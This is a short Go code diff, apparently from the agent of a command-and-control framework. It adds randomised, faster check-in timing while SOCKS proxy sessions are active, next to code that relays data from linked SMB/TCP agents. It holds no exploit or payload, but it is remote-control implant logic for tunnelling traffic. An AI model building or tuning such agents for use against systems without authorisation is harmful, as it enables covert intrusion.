@@ -802,6 +802,10 @@ func startPolling(config SyncConfig, sysInfo *NR) error {
 				nextInterval = backoffInterval
 			}
 
+			if hasActiveSocksSessions() {
+				nextInterval = time.Duration(1500+r.Intn(1000)) * time.Millisecond
+			}
+
 			// Collect link data from connected SMB/TCP agents (if any)
 			linkData := getLinkManager().getOutboundData()
 			// Collect link handshake data (for new linked agents, sent via "lh" field)
